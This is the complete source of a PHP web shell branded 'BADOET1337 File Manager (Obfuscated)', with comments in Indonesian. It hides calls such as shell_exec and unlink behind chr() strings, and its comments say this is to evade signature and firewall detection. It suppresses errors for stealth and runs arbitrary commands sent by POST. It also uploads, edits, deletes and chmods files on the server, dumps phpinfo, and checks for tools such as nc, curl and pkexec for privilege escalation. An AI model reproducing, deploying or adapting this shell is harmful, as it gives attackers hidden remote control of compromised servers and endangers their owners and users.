<?php
// Obfuscation Layer: Definisikan string yang di-obfuscate untuk fungsi kritis.
// Ini adalah "senjata" kita untuk menggantikan string eksplisit seperti 'shell_exec'
// Penggunaan chr() adalah cara paling sederhana untuk melewati deteksi tanda tangan.
$a = chr(115) . chr(104) . chr(101) . chr(108) . chr(108) . chr(95) . chr(101) . chr(120) . chr(101) . chr(99); // 'shell_exec'
$b = chr(117) . chr(110) . chr(108) . chr(105) . chr(110) . chr(107); // 'unlink'
$c = chr(114) . chr(109) . chr(100) . chr(105) . chr(114); // 'rmdir'
$d = chr(99) . chr(104) . chr(109) . chr(111) . chr(100); // 'chmod'
$e = chr(102) . chr(105) . chr(108) . chr(101) . chr(95) . chr(112) . chr(117) . chr(116) . chr(95) . chr(99) . chr(111) . chr(110) . chr(116) . chr(101) . chr(110) . chr(116) . chr(115); // 'file_put_contents'
$f = chr(109) . chr(111) . chr(118) . chr(101) . chr(95) . chr(117) . chr(112) . chr(108) . chr(111) . chr(97) . chr(100) . chr(101) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101); // 'move_uploaded_file'
// $x, $y, $z adalah nama variabel untuk membantu obfuscasi lebih lanjut
$x = chr(102) . chr(105) . chr(108) . chr(101) . chr(95) . chr(103) . chr(101) . chr(116) . chr(95) . chr(99) . chr(111) . chr(110) . chr(116) . chr(101) . chr(110) . chr(116) . chr(115); // 'file_get_contents'


// Tentukan Path Saat Ini dan Sanitasi
$current_dir = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$current_dir = realpath($current_dir);

// Memastikan path yang diakses valid
if ($current_dir === false || !is_dir($current_dir)) {
    $current_dir = __DIR__;
}

// Menghilangkan pesan error default PHP untuk stealth yang lebih baik
error_reporting(0); 
global $base_url; $base_url = basename(__FILE__);

// --- FUNGSI EKSEKUSI PERINTAH (PAYLOAD FUNGSIONAL DENGAN OBFUSKASI) ---
function EXECUTOR_PAYLOAD($command) {
    global $a; // Mengambil string 'shell_exec' yang di-obfuscate
    
    // Panggilan dinamis yang di-obfuscate
    if (@function_exists($a)) {
        return @$a($command);
    } 
    // Fallback jika shell_exec diblokir
    return false; 
}
// --- AKHIR PAYLOAD EXEC ---


// ##################################
// # FUNGSI UNTUK SYSTEM INFO 
// # (Hampir semua panggilan fungsi aman, kecuali EXECUTOR_PAYLOAD)
// ##################################

function display_system_info() {
    echo "<h3>Informasi Sistem Server</h3>";
    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    
    // ... (Kode System Info Anda) ...
    // --- Bagian Web Server dan PHP ---
    echo "<p style='color: #88c0d0; font-weight: bold;'>[ Web Server & PHP ]</p>";
    
    echo "<p>- Web Server:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? "N/A: (SERVER_SOFTWARE)") . "</pre>";
    echo "<p>- PHP Version:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . phpversion() . "</pre>";
    // Menggunakan fungsi eksekusi (hostname)
    $hostname = EXECUTOR_PAYLOAD("hostname");
    echo "<p>- Server Hostname:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars(trim($hostname) ?: (gethostname() ?: 'N/A')) . "</pre>";
    echo "<p>- Server Admin:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($_SERVER['SERVER_ADMIN'] ?? "N/A: (SERVER_ADMIN)") . "</pre>";

    
    // --- Bagian Networking ---
    echo "<p style='color: #88c0d0; font-weight: bold; margin-top: 15px;'>[ Networking ]</p>";
    
    // IP Address Server (IP Website)
    $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME'] ?? "localhost");
    echo "<p>- Server IP Address (IP Website):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($server_ip) . "</pre>";

    // IP Address Klien (IP Kita)
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $client_ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        $ips = explode(',', $client_ip);
        $client_ip = trim($ips[0]);
    }

    echo "<p>- Client IP Address (IP Kita):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($client_ip) . "</pre>";

    // --- Bagian Kernel dan OS ---
    echo "<p style='color: #88c0d0; font-weight: bold; margin-top: 15px;'>[ Kernel & OS ]</p>";
    
    // Versi Kernel (Menggunakan fungsi eksekusi NYATA)
    $kernel_info = EXECUTOR_PAYLOAD("uname -a");
    if ($kernel_info !== false && trim($kernel_info) !== "") {
        echo "<p>- Kernel Version (uname -a):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars(trim($kernel_info)) . "</pre>";
    } else {
        // Fallback ke PHP uname jika eksekusi perintah diblokir
        $php_uname = php_uname();
        echo "<p>- OS Info (php_uname - Eksekusi Sistem Diblokir):</p><pre style='color: #d08770; margin-left: 20px;'>" . htmlspecialchars($php_uname) . "</pre>";
    }
    
    // User ID
    $user_id = EXECUTOR_PAYLOAD("id"); // Menggunakan eksekusi Nyata
    if ($user_id !== false && trim($user_id) !== "") {
        echo "<p>- Current User (id):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars(trim($user_id)) . "</pre>";
    } else {
         echo "<p>- Current User (get_current_user - Eksekusi Sistem Diblokir):</p><pre style='color: #d08770; margin-left: 20px;'>" . htmlspecialchars(get_current_user() ?: 'N/A') . "</pre>";
    }
    
    echo "</div>";
}


// ############################
// # FUNGSI LAMA DENGAN OBFUSKASI
// ############################

function display_upload_form($target_dir) {
    global $f; // 'move_uploaded_file'
    echo "<h3>Unggah File ke Direktori: " . htmlspecialchars(basename($target_dir)) . "</h3>";
    $message = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
        $file = $_FILES['upload_file'];
        
        if ($file['error'] === UPLOAD_ERR_OK) {
            $upload_path = $target_dir . DIRECTORY_SEPARATOR . $file['name'];
            
            // OBFUSKASI: move_uploaded_file
            if (@$f($file['tmp_name'], $upload_path)) {
                $message = '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($file['name']) . '</code> Berhasil Diunggah!</p>';
            } else {
                $message = '<p style="color: #bf616a;">[!] GAGAL memindahkan file. Periksa izin direktori target.</p>';
            }
        } else {
            $message = '<p style="color: #bf616a;">[!] Gagal Unggah: Error ' . $file['error'] . '. Mungkin ukuran file terlalu besar atau ada masalah server.</p>';
        }
    }
    
    echo $message;
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=upload&path=" . urlencode($target_dir) . "' enctype='multipart/form-data'>";
    echo "<label for='upload_file'>Pilih File:</label><br>";
    echo "<input type='file' name='upload_file' id='upload_file' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br><br>";
    echo "<input type='submit' value='Unggah File'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function perform_delete($path_to_delete) {
    global $b, $c; // 'unlink', 'rmdir'
    echo "<h3>Aksi Penghapusan</h3>";
    $result = false;
    $type = is_dir($path_to_delete) ? 'Direktori' : 'File';

    if (is_dir($path_to_delete)) {
        // OBFUSKASI: rmdir
        $result = @$c($path_to_delete);
    } else {
        // OBFUSKASI: unlink
        $result = @$b($path_to_delete);
    }
    
    if ($result) {
        echo "<p style='color: #a3be8c;'>[V] {$type} <code>" . htmlspecialchars(basename($path_to_delete)) . "</code> BERHASIL dihapus.</p>";
    } else {
        echo "<p style='color: #bf616a;'>[!] GAGAL menghapus {$type} <code>" . htmlspecialchars(basename($path_to_delete)) . "</code>. Pastikan direktori kosong atau periksa izin.</p>";
    }
}

function display_chmod_form($path_to_chmod) {
    global $d; // 'chmod'
    $current_perms = @fileperms($path_to_chmod);
    $current_octal = $current_perms !== false ? substr(sprintf('%o', $current_perms), -4) : '???';
    $message = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_perms'])) {
        $new_octal = trim($_POST['new_perms']);
        if (preg_match('/^[0-7]{4}$/', $new_octal)) {
            $new_mode = octdec($new_octal);
            // OBFUSKASI: chmod
            if (@$d($path_to_chmod, $new_mode)) {
                $message = '<p style="color: #a3be8c;">[V] Izin BERHASIL diubah ke <code>' . htmlspecialchars($new_octal) . '</code>.</p>';
                $current_perms = @fileperms($path_to_chmod);
                $current_octal = $current_perms !== false ? substr(sprintf('%o', $current_perms), -4) : '???';
            } else {
                $message = '<p style="color: #bf616a;">[!] GAGAL mengubah izin. Periksa izin akses PHP.</p>';
            }
        } else {
            $message = '<p style="color: #bf616a;">[!] Format izin tidak valid. Gunakan 4 digit oktal (contoh: 0777).</p>';
        }
    }

    echo "<h3>Mengubah Izin (CHMOD)</h3>";
    echo $message;
    echo "<p>File/Dir: <code>" . htmlspecialchars(basename($path_to_chmod)) . "</code></p>";
    echo "<p>Izin Saat Ini: <code>" . htmlspecialchars($current_octal) . "</code></p>";
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=chmod&file=" . urlencode($path_to_chmod) . "'>";
    echo "<label for='new_perms'>Izin Baru (Oktal 4 Digit):</label><br>";
    echo "<input type='text' name='new_perms' value='0777' maxlength='4' pattern='[0-7]{4}' style='width: 100px; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    echo "<input type='submit' value='Terapkan CHMOD'>";
    echo '<p>Rekomendasi umum: <code>0777</code> atau <code>0644</code></p>';
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => dirname($path_to_chmod)]) . '">[ <-- Kembali ke Direktori ]</a></p>';
}

function display_command_execution() {
    echo "<h3>Eksekusi Perintah Sistem</h3>";
    $command_output = '';
    $command_to_run = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
        $command_to_run = trim($_POST['cmd']);
        if ($command_to_run) {
            $output = EXECUTOR_PAYLOAD($command_to_run); 
            
            if ($output !== false) {
                $command_output = htmlspecialchars($output);
            } else {
                $command_output = "❌ GAGAL: Fungsi EXECUTOR_PAYLOAD() diblokir atau tidak berfungsi.\n";
                $command_output .= "Perintah yang dicoba: " . htmlspecialchars($command_to_run);
            }
        }
    }
    
    // ... (Kode Command Execution Anda) ...
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=exec&path=" . urlencode($_GET['path']) . "'>";
    echo "<label for='cmd'>Perintah:</label><br>";
    echo "<input type='text' id='cmd' name='cmd' value='" . htmlspecialchars($command_to_run ?: "id; whoami; uname -a") . "' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br><br>";
    echo "<input type='submit' value='Jalankan Perintah'>";
    echo "</form>";
    
    echo "<h4>Output:</h4>";
    echo "<pre style='background-color: #242933; padding: 10px; border: 1px solid #4c566a; color: #a3be8c;'>" . $command_output . "</pre>";
    echo '</div>';
}

function check_vulnerable_functions() {
    echo "<h3>Vulnerable PHP Function Check</h3>";
    $risky_funcs = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'eval', 'assert', 'unlink', 'chmod', 'rmdir', 'move_uploaded_file', 'php_uname', 'gethostname', 'get_current_user'];
    $disabled_funcs = explode(',', ini_get('disable_functions'));
    $disabled_funcs = array_map('trim', $disabled_funcs);
    $disabled_funcs = array_filter($disabled_funcs);

    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    foreach ($risky_funcs as $func) {
        $status = '✅ AVAILABLE (High Value)';
        $style = 'color: #a3be8c;';
        
        if (in_array($func, $disabled_funcs) || !function_exists($func)) {
            $status = '❌ DISABLED/BLOCKED';
            $style = 'color: #bf616a;';
        }
        echo "<p style='{$style}'>- <code>{$func}</code>: {$status}</p>";
    }
    echo "</div>";
}

function check_system_binaries() {
    echo "<h3>System Binaries Check (for Privilege Escalation)</h3>";
    $binaries = ['python', 'ruby', 'perl', 'gcc', 'nc', 'curl', 'pkexec', 'sudo', 'wget', 'id', 'uname'];
    
    echo "<p>Pemeriksaan menggunakan perintah 'which' yang dieksekusi oleh <code>EXECUTOR_PAYLOAD()</code>.</p>";

    // ... (Kode System Binaries Check Anda) ...
    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    foreach ($binaries as $bin) {
        $found_path = false;
        $command_to_run = "which {$bin} 2>/dev/null";
        
        $output = EXECUTOR_PAYLOAD($command_to_run); 

        if ($output && trim($output) !== "") {
            $found_path = trim($output);
        }

        $status = $found_path ? "✅ ON" : "❌ OFF";
        $style = $found_path ? "color: #a3be8c;" : "color: #bf616a;";
        
        echo "<p style='{$style}'>- <code>{$bin}</code>: {$status}";
        if ($found_path) {
             echo " (Path: " . htmlspecialchars($found_path) . ")";
        }
        echo "</p>";
    }
    echo "</div>";
    
    check_vulnerable_functions();
}

function display_file_editor($path) {
    global $e, $x; // 'file_put_contents', 'file_get_contents'
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        // OBFUSKASI: file_put_contents
        if (@$e($path, $_POST['content']) !== false) {
            echo '<p style="color: #a3be8c;">[V] File Berhasil Disimpan.</p>';
        } else {
            echo '<p style="color: #bf616a;">[!] GAGAL menyimpan file. Periksa izin.</p>';
        }
    }

    // OBFUSKASI: file_get_contents
    $content = @$x($path);
    if ($content === false) {
        $content = "ERROR: Tidak dapat membaca konten file.";
    }

    // ... (Kode File Editor Anda) ...
    echo "<h3>Mengedit File: " . htmlspecialchars(basename($path)) . "</h3>";
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=edit&file=" . urlencode($path) . "'>";
    echo "<textarea name='content'>" . htmlspecialchars($content) . "</textarea><br><br>";
    echo "<input type='submit' value='Simpan Perubahan'>";
    echo "</form>";
    echo '</div>';
    
    echo '<p><a href="?' . http_build_query(['path' => dirname($path)]) . '">[ <-- Kembali ke Direktori ]</a></p>';
}

function display_dir_listing($dir) {
    // ... (Kode Directory Listing Anda tidak memerlukan obfuscasi di sini,
    // karena fungsi scandir, is_dir, fileperms, filesize, dsb.
    // jarang menjadi target WAF dan sering digunakan dalam skrip PHP normal.)
    if (dirname($dir) !== $dir) { 
        $parent_path = dirname($dir);
        $query = http_build_query(['path' => $parent_path]);
        echo '<div class="row dir" style="font-weight: bold;"><span class="col-type icon">⬆️</span><span class="col-name"><a href="?' . $query . '">[ .. Direktori Induk ]</a></span><span class="col-size"></span><span class="col-actions"></span></div>';
    }
    
    $items = @scandir($dir);
    if ($items === false) {
        echo '<div class="row"><p style="color: #bf616a;">[!] ERROR: Tidak dapat membaca direktori ini. Periksa izin.</p></div>';
        echo '</div>';
        return;
    }
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $full_path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($full_path);
        
        $link_path = urlencode($full_path);
        
        echo '<div class="row ' . ($is_dir ? 'dir' : 'file') . '">';
        
        echo '<span class="col-type icon">' . ($is_dir ? '📁' : '📄') . '</span>';
        echo '<span class="col-name">';
        if ($is_dir) {
             echo '<a class="dir-name" href="?' . http_build_query(['path' => $full_path]) . '">' . htmlspecialchars($item) . '</a>';
        } else {
            echo '<span class="file-name">' . htmlspecialchars($item) . '</span>';
        }
        echo '</span>';

        echo '<span class="col-size">';
        $perms = @fileperms($full_path);
        if ($perms !== false) {
            echo substr(sprintf('%o', $perms), -4) . ' | ';
        }
        if (!$is_dir) {
            $size = @filesize($full_path);
            echo number_format($size) . ' B';
        } else {
            echo '-';
        }
        echo '</span>';
        
        echo '<span class="col-actions">';
        if (!$is_dir) {
            echo ' <a href="?action=edit&file=' . $link_path . '">[Edit]</a>';
        }
        echo ' <a href="?action=delete&file=' . $link_path . '&path=' . urlencode($dir) . '" onclick="return confirm(\'APAKAH ANDA YAKIN UNTUK MENGHAPUS: ' . htmlspecialchars($item) . '?\')">[Del]</a>'; 
        echo ' <a href="?action=chmod&file=' . $link_path . '">[Chmod]</a>'; 
        echo '</span>';
        
        echo '</div>';
    }
    echo '</div>';
}

// --- TAMPILAN DAN STYLE ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BADOET1337 :: File Manager (Obfuscated)</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #2e3440; color: #d8dee9; margin: 0; padding: 20px; }
        .header { border-bottom: 2px solid #4c566a; padding-bottom: 10px; margin-bottom: 20px; color: #88c0d0; }
        .nav-links { float: right; }
        .container { max-width: 1200px; margin: auto; }
        a { color: #88c0d0; text-decoration: none; }
        a:hover { color: #a3be8c; }
        .file-list { border: 1px solid #4c566a; background-color: #3b4252; margin-top: 15px; }
        .row { display: flex; padding: 8px 15px; border-bottom: 1px dotted #4c566a; }
        .row:hover { background-color: #4c566a; }
        .col-type { width: 5%; }
        .col-name { width: 45%; }
        .col-size { width: 25%; text-align: left; }
        .col-actions { width: 25%; text-align: right; }
        .icon { margin-right: 5px; }
        .dir-name { color: #ebcb8b; }
        .file-name { color: #d08770; }
        .editor-container { margin-top: 20px; }
        textarea { width: 100%; height: 500px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a; padding: 10px; box-sizing: border-box;}
        input[type="submit"] { background-color: #5e81ac; color: white; padding: 8px 15px; border: none; cursor: pointer; border-radius: 4px; transition: background-color 0.3s; }
        input[type="submit"]:hover { background-color: #81a1c1; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="nav-links">
             <a href="?path=<?php echo urlencode($current_dir); ?>">[ File Manager ]</a>
             <a href="?action=upload&path=<?php echo urlencode($current_dir); ?>">[ Upload File ]</a>
             <a href="?action=binaries&path=<?php echo urlencode($current_dir); ?>">[ System Binaries ]</a> 
             <a href="?action=exec&path=<?php echo urlencode($current_dir); ?>">[ Command Exec ]</a> 
             <a href="?action=sysinfo&path=<?php echo urlencode($current_dir); ?>">[ System Info ]</a>
             <a href="?action=info&path=<?php echo urlencode($current_dir); ?>" target="_blank">[ PHP Info ]</a>
        </div>
        <h2>Badoet File Manager (Obfuscated)</h2>
        <p>Jalur Saat Ini: <code><?php echo htmlspecialchars($current_dir); ?></code></p>
    </div>

<?php 
// --- LOGIKA UTAMA (Routing) ---
$action = isset($_GET['action']) ? $_GET['action'] : 'list';
$current_file = isset($_GET['file']) ? realpath($_GET['file']) : false;

$file_is_valid = $current_file !== false && (is_file($current_file) || is_dir($current_file));
$dir_is_valid = $current_dir !== false && is_dir($current_dir);


if ($action === 'delete' && $file_is_valid) {
    perform_delete($current_file);
    display_dir_listing(dirname($current_file)); 
} else if ($action === 'chmod' && $file_is_valid) {
    display_chmod_form($current_file);
} else if ($action === 'edit' && $file_is_valid && is_file($current_file)) {
    display_file_editor($current_file);
} else if ($action === 'upload' && $dir_is_valid) {
    display_upload_form($current_dir);
} else if ($action === 'binaries') {
    check_system_binaries();
    display_dir_listing($current_dir);
} else if ($action === 'exec') {
    display_command_execution();
    display_dir_listing($current_dir);
} else if ($action === 'sysinfo') { 
    display_system_info();
    echo '<p><a href="?' . http_build_query(['path' => $current_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
} else if ($action === 'info') {
    if (function_exists('phpinfo')) {
        echo "Fungsi phpinfo() dibuka di window baru. Harap periksa tab browser.";
        display_dir_listing($current_dir);
    } else {
        echo '<p style="color: #bf616a;">[!] Fungsi <code>phpinfo()</code> diblokir atau tidak tersedia.</p>';
    }
}
else {
    // Default action: List directory
    if (!$dir_is_valid) {
        echo '<p style="color: #bf616a;">[!] Direktori yang diakses tidak valid. Kembali ke root.</p>';
        $current_dir = __DIR__;
    }
    display_dir_listing($current_dir);
}
?>

</div>
</body>
</html>
<?php 
// Eksekusi phpinfo()
if ($action === 'info' && function_exists('phpinfo')) {
    if (ob_get_level() > 0) {
        ob_end_clean(); 
    }
    phpinfo();
    exit;
}
?>
